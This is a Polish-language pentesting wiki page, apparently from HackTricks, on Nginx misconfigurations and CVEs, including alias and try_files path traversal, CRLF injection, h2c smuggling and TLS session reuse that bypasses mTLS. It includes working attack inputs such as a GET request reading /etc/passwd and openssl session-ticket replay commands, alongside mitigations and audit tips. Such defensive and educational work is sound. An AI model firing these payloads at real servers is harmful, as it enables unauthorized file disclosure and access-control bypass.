# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Brak lokalizacji root <a href="#missing-root-location" id="missing-root-location"></a>

Podczas konfigurowania serwera Nginx, dyrektywa **root** odgrywa kluczową rolę, określając katalog bazowy, z którego serwowane są pliki. Rozważ poniższy przykład:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
W tej konfiguracji katalog `/etc/nginx` jest wyznaczony przez dyrektywę root. Takie ustawienie pozwala na dostęp do plików wewnątrz wskazanego katalogu root, na przykład `/hello.txt`. Jednak ważne jest, by zauważyć, że zdefiniowano tylko konkretną lokację (`/hello.txt`). Brakuje konfiguracji dla lokacji root (`location / {...}`). To pominięcie powoduje, że dyrektywa root ma zastosowanie globalne, umożliwiając żądaniom do ścieżki root `/` dostęp do plików w `/etc/nginx`.

Poważne zagrożenie bezpieczeństwa wynika z tej konfiguracji. Proste żądanie `GET`, np. `GET /nginx.conf`, może ujawnić wrażliwe informacje przez serwowanie pliku konfiguracyjnego Nginx znajdującego się w `/etc/nginx/nginx.conf`. Ustawienie dyrektywy root na mniej wrażliwy katalog, np. `/etc`, może zredukować to ryzyko, lecz nadal może umożliwić niezamierzony dostęp do innych krytycznych plików, w tym innych plików konfiguracyjnych, logów dostępu oraz nawet zaszyfrowanych poświadczeń używanych do HTTP basic authentication.

## Alias LFI Misconfiguration <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

W plikach konfiguracyjnych Nginx warto dokładnie sprawdzić dyrektywy "location". Luka znana jako Local File Inclusion (LFI) może zostać nieumyślnie wprowadzona przez konfigurację przypominającą następującą:
```
location /imgs {
alias /path/images/;
}
```
Ta konfiguracja jest podatna na ataki LFI, ponieważ serwer interpretuje żądania takie jak `/imgs../flag.txt` jako próbę dostępu do plików poza zamierzonego katalogu, skutecznie rozwiązując je do `/path/images/../flag.txt`. Ta luka pozwala atakującym na pobranie plików z systemu plików serwera, które nie powinny być dostępne przez WWW.

Aby złagodzić tę podatność, konfigurację należy zmodyfikować w następujący sposób:
```
location /imgs/ {
alias /path/images/;
}
```
Więcej informacji: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Testy Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Niezabezpieczone ograniczenie ścieżki <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Sprawdź następującą stronę, aby dowiedzieć się, jak obejść dyrektywy takie jak:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Niebezpieczne użycie zmiennych / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Podatne zmienne `$uri` i `$document_ur`i — można to naprawić, zastępując je `$request_uri`.
>
> Regex może być również podatny, np.:
>
> `location ~ /docs/([^/])? { … $1 … }` - Podatne
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Niepodatne (sprawdzając spacje)
>
> `location ~ /docs/(.*)? { … $1 … }` - Niepodatne

Poniższy przykład pokazuje podatność w konfiguracji Nginx:
```
location / {
return 302 https://example.com$uri;
}
```
Znaki \r (Carriage Return) i \n (Line Feed) oznaczają znaki nowej linii w żądaniach HTTP, a ich formy zakodowane w URL są reprezentowane jako `%0d%0a`. Dołączenie tych znaków do żądania (np. `http://localhost/%0d%0aDetectify:%20clrf`) do źle skonfigurowanego serwera powoduje, że serwer wystawia nowy nagłówek o nazwie `Detectify`. Dzieje się tak, ponieważ zmienna $uri dekoduje zakodowane w URL znaki nowej linii, prowadząc do nieoczekiwanego nagłówka w odpowiedzi:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Dowiedz się więcej o ryzykach CRLF injection i response splitting pod adresem [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Ta technika jest również [**omówiona w tej prezentacji**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) z przykładami podatności i mechanizmami wykrywania. Na przykład, aby wykryć to misconfiguration z perspektywy blackbox możesz użyć następujących żądań:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Jeżeli podatne, pierwsze zwróci odpowiedź, ponieważ "X" jest dowolnym HTTP method, a drugie zwróci błąd, ponieważ H nie jest prawidłową metodą. Serwer otrzyma coś w stylu: `GET / H HTTP/1.1` i to spowoduje błąd.

Inne przykłady wykrywania to:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Niektóre znalezione podatne konfiguracje przedstawione w tej prezentacji to:

- Zwróć uwagę, jak **`$uri`** jest ustawione tak, jak w końcowym URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Zwróć uwagę, jak ponownie **`$uri`** znajduje się w URL (tym razem wewnątrz parametru)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Teraz w AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Każda zmienna

Zauważono, że **dane dostarczone przez użytkownika** mogą być traktowane jako **zmienna Nginx** w określonych okolicznościach. Przyczyna tego zachowania pozostaje nie do końca jasna, jednak nie jest to rzadkie ani łatwe do zweryfikowania. Ta anomalia została opisana w raporcie bezpieczeństwa na HackerOne, który można zobaczyć [here](https://hackerone.com/reports/370094). Dalsze badanie komunikatu o błędzie doprowadziło do zidentyfikowania jej występowania w [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), wskazując Server Side Includes (SSI) jako przyczynę.

Aby **wykryć tę niewłaściwą konfigurację**, można wykonać następujące polecenie, które ustawia nagłówek Referer, aby sprawdzić, czy zmienna zostanie wyświetlona:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Skanowania w poszukiwaniu tej niewłaściwej konfiguracji w systemach ujawniły wiele przypadków, w których użytkownik mógł wyświetlić zmienne Nginx. Jednak zmniejszenie liczby podatnych instancji sugeruje, że wysiłki w celu załatania tego problemu były częściowo skuteczne.

### Używanie try_files z zmiennymi $URI$ARGS

Poniższa niewłaściwa konfiguracja Nginx może prowadzić do LFI:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
W naszej konfiguracji mamy dyrektywę `try_files`, która służy do sprawdzania istnienia plików w określonej kolejności. Nginx zwróci pierwszy znaleziony plik. Podstawowa składnia dyrektywy `try_files` wygląda następująco:
```
try_files file1 file2 ... fileN fallback;
```
Nginx sprawdzi istnienie każdego pliku w określonej kolejności. Jeśli plik istnieje, zostanie on natychmiast obsłużony. Jeśli żaden z określonych plików nie istnieje, żądanie zostanie przekazane do opcji fallback, która może być innym URI lub konkretną stroną błędu.

Jednak przy użyciu zmiennych `$uri$args` w tej dyrektywie, Nginx spróbuje znaleźć plik, który odpowiada URI żądania połączonemu z dowolnymi argumentami query string. W związku z tym możemy wykorzystać tę konfigurację:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
Z następującym payloadem:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Używając naszego payloadu wydostaniemy się poza root directory (zdefiniowany w konfiguracji Nginx) i załadujemy plik `/etc/passwd`. W debug logs możemy zaobserwować, jak Nginx próbuje pliki:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC przeciwko Nginx z użyciem konfiguracji podanej powyżej:
![Przykładowe żądanie burp](../../images/nginx_try_files.png)

## Odczyt surowej odpowiedzi backendu

Nginx oferuje funkcję poprzez `proxy_pass`, która pozwala na przechwytywanie błędów i nagłówków HTTP generowanych przez backend w celu ukrycia wewnętrznych komunikatów o błędach i nagłówków. Odbywa się to poprzez serwowanie przez Nginx niestandardowych stron błędów w odpowiedzi na błędy backendu. Problemy pojawiają się jednak, gdy Nginx napotka nieprawidłowe żądanie HTTP. Takie żądanie jest przesyłane do backendu w takiej formie, w jakiej wpłynęło, a surowa odpowiedź backendu jest następnie wysyłana bezpośrednio do clienta bez udziału Nginx.

Rozważmy przykładowy scenariusz z aplikacją uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Aby to obsłużyć, w konfiguracji Nginx używane są określone dyrektywy:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Ta dyrektywa umożliwia Nginx serwowanie niestandardowej odpowiedzi dla odpowiedzi backendu ze statusem większym niż 300. Zapewnia, że dla naszego przykładowego aplikacji uWSGI odpowiedź `500 Error` zostanie przechwycona i obsłużona przez Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Jak sama nazwa wskazuje, ta dyrektywa ukrywa określone nagłówki HTTP przed klientem, zwiększając prywatność i bezpieczeństwo.

Gdy wysyłane jest poprawne żądanie `GET`, Nginx przetwarza je normalnie, zwracając standardową odpowiedź błędu bez ujawniania żadnych tajnych nagłówków. Jednak nieprawidłowe żądanie HTTP omija ten mechanizm, prowadząc do ujawnienia surowych odpowiedzi backendu, w tym tajnych nagłówków i komunikatów o błędach.

## merge_slashes set to off

Domyślnie dyrektywa Nginx **`merge_slashes`** jest ustawiona na **`on`**, co kompresuje wielokrotne ukośniki w URL do pojedynczego ukośnika. Ta funkcja, choć upraszcza przetwarzanie URL, może mimowolnie ukrywać luki w zabezpieczeniach aplikacji stojących za Nginx, szczególnie te podatne na local file inclusion (LFI). Eksperci bezpieczeństwa Danny Robinson i Rotem Bar zwrócili uwagę na potencjalne ryzyko związane z tym domyślnym zachowaniem, zwłaszcza gdy Nginx działa jako reverse-proxy.

Aby złagodzić takie ryzyko, zaleca się **wyłączyć dyrektywę `merge_slashes`** dla aplikacji podatnych na te luki. Zapewnia to, że Nginx przekaże żądania do aplikacji bez modyfikowania struktury URL, nie maskując tym samym żadnych ukrytych problemów bezpieczeństwa.

Aby uzyskać więcej informacji, zobacz [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Złośliwe nagłówki odpowiedzi**

Jak pokazano w [**this writeup**](https://mizu.re/post/cors-playground), istnieją pewne nagłówki, które jeśli pojawią się w odpowiedzi serwera WWW, zmienią zachowanie proxy Nginx. Możesz je sprawdzić [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Wskazuje Nginxowi, aby wewnętrznie przekierował żądanie do określonej lokalizacji.
- `X-Accel-Buffering`: Kontroluje, czy Nginx powinien buforować odpowiedź, czy nie.
- `X-Accel-Charset`: Ustawia zestaw znaków dla odpowiedzi przy użyciu X-Accel-Redirect.
- `X-Accel-Expires`: Ustawia czas wygaśnięcia odpowiedzi przy użyciu X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Ogranicza szybkość transferu odpowiedzi przy użyciu X-Accel-Redirect.

Na przykład nagłówek **`X-Accel-Redirect`** spowoduje wewnętrzne **redirect** w nginx. Zatem konfiguracja nginx zawierająca coś takiego jak **`root /`** i odpowiedź od serwera WWW z **`X-Accel-Redirect: .env`** spowoduje, że nginx wyśle zawartość **`/.env`** (Path Traversal).

### **Default Value in Map Directive**

W **konfiguracji Nginx** dyrektywa `map` często odgrywa rolę w **kontroli autoryzacji**. Częstym błędem jest nieokreślenie wartości **default**, co może prowadzić do nieautoryzowanego dostępu. Na przykład:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Bez `default`, **malicious user** może obejść zabezpieczenia, uzyskując dostęp do **undefined URI** w ramach `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) zaleca ustawienie **default value**, aby uniknąć takich problemów.

### **DNS Spoofing Vulnerability**

DNS spoofing przeciwko Nginx jest możliwy w pewnych warunkach. Jeśli atakujący zna **DNS server** używany przez Nginx i potrafi przechwycić jego zapytania DNS, może sfałszować rekordy DNS. Ta metoda jest jednak nieskuteczna, jeśli Nginx jest skonfigurowany do używania **localhost (127.0.0.1)** do rozwiązywania DNS. Nginx pozwala określić serwer DNS w następujący sposób:
```yaml
resolver 8.8.8.8;
```
### **`proxy_pass` i `internal` dyrektywy**

Dyrektywa **`proxy_pass`** jest wykorzystywana do przekierowywania żądań do innych serwerów, zarówno wewnętrznych, jak i zewnętrznych. Dyrektywa **`internal`** zapewnia, że niektóre lokalizacje są dostępne tylko wewnątrz nginx. Chociaż same w sobie te dyrektywy nie są podatnościami, ich konfiguracja wymaga wnikliwej analizy, aby zapobiec lukom bezpieczeństwa.

## proxy_set_header Upgrade & Connection

Jeśli serwer nginx jest skonfigurowany do przekazywania nagłówków Upgrade i Connection, można przeprowadzić [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md), aby uzyskać dostęp do chronionych/wewnętrznych punktów końcowych.

> [!CAUTION]
> Ta podatność pozwoliłaby atakującemu na **nawiązanie bezpośredniego połączenia z `proxy_pass` endpointem** (`http://backend:9999` w tym przypadku), którego zawartość nie będzie sprawdzana przez nginx.

Przykład podatnej konfiguracji umożliwiającej wykradzenie `/flag` znajdziesz [tutaj](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Należy pamiętać, że nawet jeśli `proxy_pass` wskazywał na konkretną **ścieżkę** taką jak `http://backend:9999/socket.io`, połączenie zostanie nawiązane z `http://backend:9999`, więc możesz **skontaktować się z dowolną inną ścieżką wewnątrz tego wewnętrznego endpointu. Dlatego nie ma znaczenia, czy w URL `proxy_pass` podano ścieżkę.**

## HTTP/3 QUIC module remote DoS & leak (2024)

W 2024 Nginx ujawnił CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 i CVE-2024-35200, pokazując, że **pojedyncza wroga sesja QUIC** może zablokować procesy robocze lub spowodować leak pamięci, gdy eksperymentalny `ngx_http_v3_module` jest skompilowany i wystawiony jest socket `listen ... quic`. Zainfekowane buildy to 1.25.0–1.25.5 oraz 1.26.0, natomiast 1.27.0/1.26.1 zawierają poprawki; ujawnienie pamięci (CVE-2024-34161) dodatkowo wymaga MTU większych niż 4096 bajtów, aby ujawnić dane wrażliwe (szczegóły w advisorry nginx z 2024 r. wymienionym poniżej).

**Recon & exploitation hints**

- HTTP/3 jest opcjonalny (opt-in), więc skanuj odpowiedzi `Alt-Svc: h3=":443"` lub przeprowadzaj brute-force UDP/443 QUIC handshakes; po potwierdzeniu fuzzuj handshake i ramki STREAM za pomocą niestandardowych payloadów `quiche-client`/`nghttp3`, aby wywołać crashy procesów roboczych i wymusić leak logów.
- Quickly fingerprint target support with:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Omijanie wznawiania sesji TLS przy uwierzytelnianiu certyfikatem klienta (CVE-2025-23419)

W lutym 2025 roku opublikowano komunikat, że nginx 1.11.4–1.27.3 skompilowany z OpenSSL pozwala na **ponowne użycie sesji TLS 1.3** z jednego wirtualnego hosta opartego na nazwie wewnątrz innego, więc klient, który negocjował host bez certyfikatu, może odtworzyć ticket/PSK, aby wskoczyć do vhosta chronionego przez `ssl_verify_client on;` i całkowicie pominąć mTLS. Błąd występuje zawsze, gdy wiele virtual hostów współdzieli ten sam cache sesji TLS 1.3 i tickety (zob. komunikat nginx z 2025 roku cytowany poniżej).

**Scenariusz atakującego**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Jeśli cel jest podatny, drugi handshake kończy się bez przedstawienia certyfikatu klienta, ujawniając chronione lokalizacje.

**Co audytować**

- Mieszane `server_name` blocks które współdzielą `ssl_session_cache shared:SSL` oraz `ssl_session_tickets on;`.
- Bloki Admin/API, które oczekują mTLS, ale dziedziczą współdzielone ustawienia pamięci podręcznej sesji/ticketów z hostów publicznych.
- Automatyzacja, która globalnie włącza wznawianie sesji TLS 1.3 (np. Ansible roles) bez uwzględnienia izolacji vhost.

## Odporność na HTTP/2 Rapid Reset (zachowanie CVE-2023-44487)

Atak HTTP/2 Rapid Reset (CVE-2023-44487) nadal wpływa na nginx, gdy operatorzy podnoszą `keepalive_requests` lub `http2_max_concurrent_streams` ponad wartości domyślne: atakujący otwiera jedno połączenie HTTP/2, zalewa je tysiącami strumieni, a następnie natychmiast wysyła ramki `RST_STREAM`, dzięki czemu sufit współbieżności nigdy nie zostaje osiągnięty, podczas gdy CPU nadal pali się na logice zamykania. Domyślne ustawienia nginx (128 concurrent streams, 1000 keepalive requests) utrzymują małe pole rażenia; znaczne podniesienie tych limitów ułatwia wyczerpanie workers nawet przez jednego klienta (zob. F5 write-up wspomniany poniżej).

**Wskazówki wykrywania**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Hosty, które ujawniają wyjątkowo wysokie wartości tych dyrektyw, są łakomym kąskiem: pojedynczy klient HTTP/2 może w pętli tworzyć strumienie i natychmiast wysyłać ramki `RST_STREAM`, żeby utrzymać CPU na pełnym obciążeniu bez przekroczenia limitu jednoczesności.

## Wypróbuj sam

Detectify utworzyło repozytorium na GitHubie, w którym możesz użyć Dockera, aby skonfigurować własny podatny na ataki serwer testowy Nginx z niektórymi omówionymi w tym artykule błędnymi konfiguracjami i spróbować je samodzielnie znaleźć!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Narzędzia do analizy statycznej

### [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)

GixyNG (zaktualizowany fork GIXY) to narzędzie do analizy konfiguracji Nginx, którego celem jest wykrywanie podatności, niebezpiecznych dyrektyw i ryzykownych błędów konfiguracyjnych. Dodatkowo znajduje nieprawidłowe konfiguracje wpływające na wydajność oraz wykrywa pominięte możliwości hardeningu, umożliwiając automatyczne wykrywanie luk.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner to proste narzędzie do wyszukiwania typowych błędów konfiguracyjnych Nginx oraz podatności.

## Źródła

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
